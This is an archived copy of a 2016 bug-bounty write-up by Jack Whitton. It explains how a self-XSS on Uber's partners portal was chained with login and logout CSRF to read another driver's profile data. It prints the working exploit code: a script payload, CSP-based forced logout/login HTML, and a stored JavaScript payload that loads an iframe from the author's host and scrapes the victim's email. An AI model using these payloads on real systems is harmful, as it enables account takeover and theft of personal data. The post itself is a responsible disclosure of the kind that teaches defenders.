---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-03-22_uber-bug-bounty-turning-self-xss-into-good-xss.md
original_filename: 2016-03-22_uber-bug-bounty-turning-self-xss-into-good-xss.md
title: 'Uber Bug Bounty: Turning Self-XSS into Good-XSS'
category: documents
detected_topics:
- xss
- oauth
- command-injection
- otp
- automation-abuse
- csrf
tags:
- imported
- documents
- xss
- oauth
- command-injection
- otp
- automation-abuse
- csrf
language: en
raw_sha256: c5ed860d2fb2e784c276462dc27c5a3618bed945e6877869eec8a5386b0fc97f
text_sha256: a8c3c95a84420d5151849bda8d95264818ea6ea72f01bcfeff486d88088a55c7
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Uber Bug Bounty: Turning Self-XSS into Good-XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-03-22_uber-bug-bounty-turning-self-xss-into-good-xss.md
- Source Type: markdown
- Detected Topics: xss, oauth, command-injection, otp, automation-abuse, csrf
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `c5ed860d2fb2e784c276462dc27c5a3618bed945e6877869eec8a5386b0fc97f`
- Text SHA256: `a8c3c95a84420d5151849bda8d95264818ea6ea72f01bcfeff486d88088a55c7`


## Content

---
title: "Uber Bug Bounty: Turning Self-XSS into Good-XSS"
page_title: "Uber Bug Bounty: Turning Self-XSS into Good-XSS – Jack"
url: "https://whitton.io/articles/uber-turning-self-xss-into-good-xss/"
final_url: "https://whitton.io/articles/uber-turning-self-xss-into-good-xss/"
authors: ["Jack Whitton (@fin1te)"]
programs: ["Uber"]
bugs: ["XSS"]
publication_date: "2016-03-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6310
---

# [Uber Bug Bounty: Turning Self-XSS into Good-XSS](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/ "Uber Bug Bounty: Turning Self-XSS into Good-XSS")

## March 22, 2016

__Reading time ~6 minutes

_Now that the Uber bug bounty programme has launched publicly, I can publish some of my favourite submissions, which I’ve been itching to do over the past year. This is part one of maybe two or three posts._

On Uber’s [Partners portal](https://partners.uber.com), where Drivers can login and update their details, I found a very simple, classic XSS: changing the value of one of the profile fields to `<script>alert(document.domain);</script>` causes the code to be executed, and an alert box popped.

[ ![](/images/uber-partners-xss/uber-partners-xss-1-1.png) ](/images/uber-partners-xss/uber-partners-xss-1-1.png) [ ![](/images/uber-partners-xss/uber-partners-xss-1-2.png) ](/images/uber-partners-xss/uber-partners-xss-1-2.png)

This took all of two minutes to find after signing up, but now comes the fun bit.

### Self-XSS

Being able to execute additional, arbitrary JavaScript under the context of another site is called [Cross-Site Scripting](https://en.wikipedia.org/wiki/Cross-site_scripting) (which I’m assuming 99% of my readers know). Normally you would want to do this against other users in order to yank session cookies, submit XHR requests, and so on.

If you _can’t_ do this against another user - for example, the code only executes against your account, then this is known as a self-XSS.

In this case, it would seem that’s what we’ve found. The address section of your profile is only shown to you (the exception may be if an internal Uber tool also displays the address, but that’s another matter), and we can’t update another user’s address to force it to be executed against them.

I’m always hesitant to send in bugs which have potential (an XSS in this site would be cool), so let’s try and find a way of removing the “self” part from the bug.

### Uber OAuth Login Flow

The [OAuth](https://en.wikipedia.org/wiki/OAuth) that flow Uber uses is pretty typical:

  * User visits an Uber site which requires login, e.g. `partners.uber.com`
  * User is redirected to the authorisation server, `login.uber.com`
  * User enters their credentials
  * User is redirected back to `partners.uber.com` with a code, which can then be exchanged for an access token

[ ![](/images/uber-partners-xss/uber-partners-xss-2.png) ](/images/uber-partners-xss/uber-partners-xss-2.png)

In case you haven’t spotted from the above screenshot, the OAuth callback, `/oauth/callback?code=...`, doesn’t use the recommended [`state`](http://www.twobotechnologies.com/blog/2014/02/importance-of-state-in-oauth2.html) parameter. This introduces a CSRF vulnerability in the login function, which may or may-not be considered an important issue.

In addition, there is a CSRF vulnerability in the logout function, which _really_ isn’t considered an issue. Browsing to `/logout` destroys the user’s `partner.uber.com` session, and performs a redirect to the same logout function on `login.uber.com`.

Since our payload is only available inside our account, we want to log the user into our account, which in turn will execute the payload. However, logging them into our account destroys their session, which destroys a lot of the value of the bug (it’s no longer possible to perform actions on their account). So let’s chain these three minor issues (self-XSS and two CSRF’s) together.

_For more info on OAuth security, check out[@homakov’s awesome guide](http://www.oauthsecurity.com/)._

### Chaining Minor Bugs

Our plan has three parts to it:

  * First, log the user out of their `partner.uber.com` session, but _not_ their `login.uber.com` session. This ensures that we can log them back into their account
  * Second, log the user into _our_ account, so that our payload will be executed
  * Finally, log them back into _their_ account, whilst our code is still running, so that we can access their details

#### Step 1. Logging Out of Only One Domain

We first want to issue a request to `https://partners.uber.com/logout/`, so that we can then log them into our account. The problem is that issuing a requets to this end-point results in a 302 redirect to `https://login.uber.com/logout/`, which destroys the session. We can’t intercept each redirect and drop the request, since the browser follows these implicitly.

However, one trick we can do is to use [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/Security/CSP) to define which sources are allowed to be loaded (I hope you can see the irony in using a feature designed to help mitigate XSS in this context).

We’ll set our policy to only allow requests to `partners.uber.com`, which will block `https://login.uber.com/logout/`.
  
  
  <!-- Set content security policy to block requests to login.uber.com, so the target maintains their session -->
  <meta http-equiv="Content-Security-Policy" content="img-src https://partners.uber.com">
  <!-- Logout of partners.uber.com -->
  <img src="https://partners.uber.com/logout/">

This works, as indicated by the CSP violation error message:

[ ![](/images/uber-partners-xss/uber-partners-xss-2.png) ](/images/uber-partners-xss/uber-partners-xss-3.png)

#### Step 2. Logging Into Our Account

This one is relatively simple. We issue a request to `https://partners.uber.com/login/` to initiate a login (this is needed else the application won’t accept the callback). Using the CSP trick we prevent the flow being completed, then we feed in our own `code` (which can be obtained by logging into our own account), which logs them in to our account.

Since a CSP violation triggers the `onerror` event handler, this will be used to jump to the next step.
  
  
  <!-- Set content security policy to block requests to login.uber.com, so the target maintains their session -->
  <meta http-equiv="Content-Security-Policy" content="img-src partners.uber.com">
  <!-- Logout of partners.uber.com -->
  <img src="https://partners.uber.com/logout/" onerror="login();">
  <script>
  //Initiate login so that we can redirect them
  var login = function() {
  var loginImg = document.createElement('img');
  loginImg.src = 'https://partners.uber.com/login/';
  loginImg.onerror = redir;
  }
  //Redirect them to login with our code
  var redir = function() {
  //Get the code from the URL to make it easy for testing
  var code = window.location.hash.slice(1);
  var loginImg2 = document.createElement('img');
  loginImg2.src = 'https://partners.uber.com/oauth/callback?code=' + code;
  loginImg2.onerror = function() {
  //Redirect to the profile page with the payload
  window.location = 'https://partners.uber.com/profile/';
  }
  }
  </script>

#### Step 3. Switching Back to Their Account

This part is the code that will be contained as the XSS payload, stored in our account.

As soon as this payload is executed, we can switch back to their account. This **must** be in an iframe - we need to be able to continue running our code.
  
  
  //Create the iframe to log the user out of our account and back into theirs
  var loginIframe = document.createElement('iframe');
  loginIframe.setAttribute('src', 'https://fin1te.net/poc/uber/login-target.html');
  document.body.appendChild(loginIframe);

The contents of the iframe uses the CSP trick again:
  
  
  <!-- Set content security policy to block requests to login.uber.com, so the target maintains their session -->
  <meta http-equiv="Content-Security-Policy" content="img-src partners.uber.com">
  <!-- Log the user out of our partner account -->
  <img src="https://partners.uber.com/logout/" onerror="redir();">
  <script>
  //Log them into partners via their session on login.uber.com
  var redir = function() {
  window.location = 'https://partners.uber.com/login/';
  };
  </script>

The final piece is to create _another_ iframe, so we can grab some of their data.
  
  
  //Wait a few seconds, then load the profile page, which is now *their* profile
  setTimeout(function() {
  var profileIframe = document.createElement('iframe');
  profileIframe.setAttribute('src', 'https://partners.uber.com/profile/');
  profileIframe.setAttribute('id', 'pi');
  document.body.appendChild(profileIframe);
  //Extract their email as PoC
  profileIframe.onload = function() {
  var d = document.getElementById('pi').contentWindow.document.body.innerHTML;
  var matches = /value="([^"]+)" name="email"/.exec(d);
  alert(matches[1]);
  }
  }, 9000);

Since our final iframe is loaded from the same origin as the Profile page containing our JS, and `X-Frame-Options` is set to `sameorigin` **not** `deny`, we can access the content inside of it (using [`contentWindow`](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#Cross-origin_script_API_access))

[ ![](/images/uber-partners-xss/uber-partners-xss-5.png) ](/images/uber-partners-xss/uber-partners-xss-5.png)

### Putting It All Together

After combining all the steps, we have the following attack flow:

  * Add the payload from step 3 to our profile
  * Login to our account, but cancel the callback and make note of the unused `code` parameter
  * Get the user to visit the file we created from step 2 - this is similar to how you would execute a reflected-XSS against someone
  * The user will then be logged out, and logged into our account
  * The payload from step 3 will be executed
  * In a hidden iframe, they’ll be logged out of _our_ account
  * In another hidden iframe, they’ll be logged into _their_ account
  * We now have an iframe, in the same origin containing the user’s session

This was a fun bug, and proves that it’s worth persevering to show a bug can have a higher impact than originally thought.

[websec](https://whitton.io/tags/#websec "Pages tagged websec")[bugbounty](https://whitton.io/tags/#bugbounty "Pages tagged bugbounty")[xss](https://whitton.io/tags/#xss "Pages tagged xss")[selfxss](https://whitton.io/tags/#selfxss "Pages tagged selfxss")[uber](https://whitton.io/tags/#uber "Pages tagged uber") Updated on March 22, 2016 Jack

  * [__Like](https://www.facebook.com/sharer/sharer.php?u=https://whitton.io/articles/uber-turning-self-xss-into-good-xss/ "Share on Facebook")
  * [__Tweet](https://twitter.com/intent/tweet?text=https://whitton.io/articles/uber-turning-self-xss-into-good-xss/ "Share on Twitter")
  * [__+1](https://plus.google.com/share?url=https://whitton.io/articles/uber-turning-self-xss-into-good-xss/ "Share on Google Plus")

[Read More](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)

### [From Bug Bounty Hunter, to Engineer, and Beyond](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/ "From Bug Bounty Hunter, to Engineer, and Beyond")

A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a "new chapter" in my ...… [Continue reading](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/)

#### [Obtaining Login Tokens for an Outlook, Office or Azure Account](https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/ "Obtaining Login Tokens for an Outlook, Office or Azure Account")

Published on April 03, 2016

#### [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/ "An XSS on Facebook via PNGs & Wonky Content Types")

Published on January 27, 2016
